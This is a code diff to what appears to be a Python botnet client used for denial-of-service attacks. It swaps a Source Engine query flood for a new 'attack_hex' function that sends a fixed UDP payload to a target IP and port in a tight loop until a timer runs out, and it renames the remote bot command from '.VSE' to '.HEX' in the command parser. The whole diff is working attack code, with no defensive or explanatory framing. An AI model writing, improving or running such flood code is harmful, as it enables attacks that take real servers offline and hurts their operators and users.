@@ -23,10 +23,15 @@ base_user_agents = [
 def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 
-def attack_vse(ip, port, secs):
-    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
+def attack_hex(ip, port, secs):
+    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
+        s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
 
 def attack_udp(ip, port, secs, size):
@@ -99,7 +104,7 @@ def main():
             args = data.split(' ')
             command = args[0].upper()
 
-            if command == '.VSE':
+            if command == '.HEX':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
